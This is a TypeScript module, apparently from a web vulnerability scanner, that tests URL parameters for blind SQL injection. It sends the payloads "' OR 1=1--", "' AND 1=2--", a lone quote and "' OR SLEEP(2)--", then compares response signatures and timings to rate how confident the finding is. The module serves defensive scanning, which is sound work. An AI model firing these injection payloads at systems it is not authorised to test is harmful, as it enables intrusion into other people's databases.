import { createHash } from "node:crypto";
import { loadAttempt } from "@/server/scans/helpers";

export type ResponseSignature = {
  status: number;
  length: number;
  normalizedHash: string;
  jsonShape?: string[];
  recordCount?: number | null;
  responseClass: string;
  durationMs: number;
};

export type BlindSqlProbeResult = {
  url: string;
  method: string;
  parameter: string;
  technique: "boolean" | "time" | "content-diff" | "status-diff" | "record-count-diff";
  baseline: ResponseSignature[];
  trueCondition?: ResponseSignature[];
  falseCondition?: ResponseSignature[];
  control?: ResponseSignature[];
  baselineMedianMs?: number;
  testMedianMs?: number;
  controlMedianMs?: number;
  confidence: "INFO" | "LIKELY" | "CONFIRMED";
  evidenceSummary: string;
};

function median(values: number[]) {
  const sorted = values.filter(Number.isFinite).sort((a, b) => a - b);
  if (!sorted.length) {
    return 0;
  }
  return sorted[Math.floor(sorted.length / 2)];
}

function responseClass(status: number) {
  if (status >= 200 && status < 300) return "success";
  if (status >= 300 && status < 400) return "redirect";
  if (status === 401) return "unauthorized";
  if (status === 403) return "forbidden";
  if (status === 404) return "not-found";
  if (status >= 500) return "server-error";
  return "client-error";
}

function normalizedHash(body: string) {
  return createHash("sha256")
    .update(body.replace(/\b\d{10,}\b/g, "0").replace(/\s+/g, " ").trim().slice(0, 80_000))
    .digest("hex")
    .slice(0, 16);
}

function parseJson(body: string) {
  try {
    return JSON.parse(body) as unknown;
  } catch {
    return null;
  }
}

function jsonShape(value: unknown, prefix = ""): string[] {
  if (Array.isArray(value)) {
    return value.slice(0, 2).flatMap((entry, index) => jsonShape(entry, `${prefix}[${index}]`));
  }
  if (!value || typeof value !== "object") {
    return prefix ? [prefix] : [];
  }
  return Object.entries(value as Record<string, unknown>)
    .slice(0, 30)
    .flatMap(([key, entry]) => jsonShape(entry, prefix ? `${prefix}.${key}` : key));
}

function recordCount(body: string): number | null {
  const parsed = parseJson(body);
  if (Array.isArray(parsed)) {
    return parsed.length;
  }
  if (parsed && typeof parsed === "object") {
    for (const value of Object.values(parsed as Record<string, unknown>)) {
      if (Array.isArray(value)) {
        return value.length;
      }
    }
  }
  return null;
}

function applyParameter(url: string, parameter: string, value: string) {
  const parsed = new URL(url);
  if (parsed.hash.includes("?")) {
    const [hashPath, hashQuery = ""] = parsed.hash.slice(1).split("?");
    const params = new URLSearchParams(hashQuery);
    params.set(parameter, value);
    parsed.hash = `${hashPath}?${params.toString()}`;
    return parsed.toString();
  }
  parsed.searchParams.set(parameter, value);
  return parsed.toString();
}

async function signature(url: string, headers: HeadersInit | undefined, timeoutMs: number): Promise<ResponseSignature | null> {
  const attempt = await loadAttempt(url, {
    timeoutMs,
    followRedirects: false,
    headers,
  });
  if (!attempt) {
    return null;
  }
  const parsed = parseJson(attempt.bodyText);
  return {
    status: attempt.status,
    length: attempt.bodyText.length,
    normalizedHash: normalizedHash(attempt.bodyText),
    jsonShape: parsed ? jsonShape(parsed).slice(0, 40) : undefined,
    recordCount: recordCount(attempt.bodyText),
    responseClass: responseClass(attempt.status),
    durationMs: attempt.totalDurationMs ?? attempt.durationMs,
  };
}

function stableDifference(left: ResponseSignature[], right: ResponseSignature[]) {
  if (!left.length || !right.length) {
    return 0;
  }
  const leftFirst = left[0];
  const rightFirst = right[0];
  let dimensions = 0;
  if (left.every((entry) => entry.status === leftFirst.status) && right.every((entry) => entry.status === rightFirst.status) && leftFirst.status !== rightFirst.status) {
    dimensions += 1;
  }
  if (
    leftFirst.recordCount !== null &&
    rightFirst.recordCount !== null &&
    Math.abs((leftFirst.recordCount ?? 0) - (rightFirst.recordCount ?? 0)) >= 3
  ) {
    dimensions += 1;
  }
  if (Math.abs(median(left.map((entry) => entry.length)) - median(right.map((entry) => entry.length))) > 800) {
    dimensions += 1;
  }
  if (leftFirst.normalizedHash !== rightFirst.normalizedHash) {
    dimensions += 1;
  }
  return dimensions;
}

export async function runBlindSqlInjectionProbe(input: {
  configs: Array<{ url: string; parameter: string }>;
  headersFor?: (url: string) => HeadersInit | undefined;
  mode?: "Fast" | "Deep" | "Authenticated";
  maxParameters?: number;
  timeoutMs?: number;
}) {
  const mode = input.mode ?? "Fast";
  const repeats = mode === "Deep" ? 3 : mode === "Authenticated" ? 2 : 1;
  const includeTime = mode === "Deep";
  const timeoutMs = input.timeoutMs ?? (includeTime ? 7_000 : 5_000);
  const results: BlindSqlProbeResult[] = [];

  for (const config of input.configs.slice(0, input.maxParameters ?? (mode === "Deep" ? 6 : 4))) {
    const headers = input.headersFor?.(config.url);
    const baselineUrls = Array.from({ length: repeats }, () => applyParameter(config.url, config.parameter, "fixnx_sql_baseline"));
    const trueUrls = Array.from({ length: repeats }, () => applyParameter(config.url, config.parameter, "' OR 1=1--"));
    const falseUrls = Array.from({ length: repeats }, () => applyParameter(config.url, config.parameter, "' AND 1=2--"));
    const controlUrls = Array.from({ length: repeats }, () => applyParameter(config.url, config.parameter, "'"));
    const [baseline, trueCondition, falseCondition, control] = await Promise.all([
      Promise.all(baselineUrls.map((url) => signature(url, headers, timeoutMs))),
      Promise.all(trueUrls.map((url) => signature(url, headers, timeoutMs))),
      Promise.all(falseUrls.map((url) => signature(url, headers, timeoutMs))),
      Promise.all(controlUrls.map((url) => signature(url, headers, timeoutMs))),
    ]);
    const baselineRows = baseline.filter((entry): entry is ResponseSignature => Boolean(entry));
    const trueRows = trueCondition.filter((entry): entry is ResponseSignature => Boolean(entry));
    const falseRows = falseCondition.filter((entry): entry is ResponseSignature => Boolean(entry));
    const controlRows = control.filter((entry): entry is ResponseSignature => Boolean(entry));
    const trueFalseDimensions = stableDifference(trueRows, falseRows);
    const baselineControlDimensions = stableDifference(baselineRows, controlRows);
    const confirmed = trueRows.length >= 2 && falseRows.length >= 2 && trueFalseDimensions >= 2 && baselineControlDimensions <= 1;

    results.push({
      url: config.url,
      method: "GET",
      parameter: config.parameter,
      technique: trueFalseDimensions >= 2 ? "boolean" : trueFalseDimensions === 1 ? "content-diff" : "boolean",
      baseline: baselineRows,
      trueCondition: trueRows,
      falseCondition: falseRows,
      control: controlRows,
      confidence: confirmed ? "CONFIRMED" : trueFalseDimensions >= 1 ? "LIKELY" : "INFO",
      evidenceSummary: confirmed
        ? `Boolean true/false payloads were stable across repeated probes in ${trueFalseDimensions} dimensions.`
        : trueFalseDimensions >= 1
          ? "Boolean payloads showed a difference, but repeated proof was not strong enough to confirm exploitability."
          : "No stable boolean blind SQL behavior was observed.",
    });

    if (!includeTime) {
      continue;
    }

    const delayPayload = "' OR SLEEP(2)--";
    const delayUrls = Array.from({ length: repeats }, () => applyParameter(config.url, config.parameter, delayPayload));
    const delayRows = (await Promise.all(delayUrls.map((url) => signature(url, headers, timeoutMs)))).filter(
      (entry): entry is ResponseSignature => Boolean(entry),
    );
    const baselineMedianMs = median(baselineRows.map((entry) => entry.durationMs));
    const testMedianMs = median(delayRows.map((entry) => entry.durationMs));
    const controlMedianMs = median(controlRows.map((entry) => entry.durationMs));
    const threshold = 1_400;
    const timeConfirmed =
      delayRows.length >= 2 &&
      testMedianMs >= baselineMedianMs + threshold &&
      testMedianMs >= controlMedianMs + threshold;
    results.push({
      url: config.url,
      method: "GET",
      parameter: config.parameter,
      technique: "time",
      baseline: baselineRows,
      control: controlRows,
      trueCondition: delayRows,
      baselineMedianMs,
      testMedianMs,
      controlMedianMs,
      confidence: timeConfirmed ? "CONFIRMED" : testMedianMs >= baselineMedianMs + threshold ? "LIKELY" : "INFO",
      evidenceSummary: timeConfirmed
        ? "Time-based delay was stable across repeated baseline/control/test probes."
        : "No stable time-based blind SQL delay was confirmed.",
    });
  }

  return results;
}
